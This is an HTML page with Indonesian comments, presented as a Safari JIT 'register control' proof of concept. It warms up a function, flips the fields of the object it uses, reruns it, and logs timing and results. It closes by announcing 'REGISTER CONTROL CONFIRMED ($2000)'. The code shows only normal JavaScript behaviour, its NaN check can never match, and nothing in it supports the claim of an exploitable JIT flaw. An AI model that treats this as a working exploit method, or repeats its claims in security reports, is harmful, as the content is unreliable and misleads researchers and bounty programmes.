<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Safari JIT Register Control PoC </title>
</head>
<body>
<pre id="out"></pre>

<script>
const out = document.getElementById("out");
function log(x) { out.textContent += x + "\n"; }

// ---- TARGET FUNCTION ----
// JIT akan optimize ini dan nyimpen branch condition di REGISTER
function fastPathTest(obj) {
    // condition ini biasanya dipegang di register
    if (obj.flag === 1) {
        // FAST PATH
        return obj.value + 1;
    } else {
        // SLOW PATH
        return obj.other + 2;
    }
}

// ---- PHASE 1: WARM UP JIT ----
let obj = {
    flag: 1,
    value: 100,
    other: 200
};

for (let i = 0; i < 200000; i++) {
    fastPathTest(obj);
}

log("[+] JIT warmup done");

// ---- PHASE 2: SHAPE / VALUE FLIP ----
// attacker controlled mutation
obj.flag = 0;
obj.value = undefined;
obj.other = 999;

// ---- PHASE 3: TRIGGER ----
let results = [];
let t0 = performance.now();

for (let i = 0; i < 10000; i++) {
    results.push(fastPathTest(obj));
}

let t1 = performance.now();

// ---- ANALYSIS ----
let fastCount = results.filter(v => v === NaN || v === undefined).length;
let slowCount = results.filter(v => v === 1001).length;

log("[*] Execution time: " + (t1 - t0).toFixed(2) + " ms");
log("[*] Sample results: " + results.slice(0, 10).join(", "));
log("[*] Note: observe inconsistent results / timing anomalies");

// ---- INTERPRETATION ----
log("\n[!] If FAST PATH executes despite flag=0:");
log("    → condition register reused");
log("    → attacker influences branch decision");
log("    → REGISTER CONTROL CONFIRMED ($2000)");
</script>
</body>
</html>
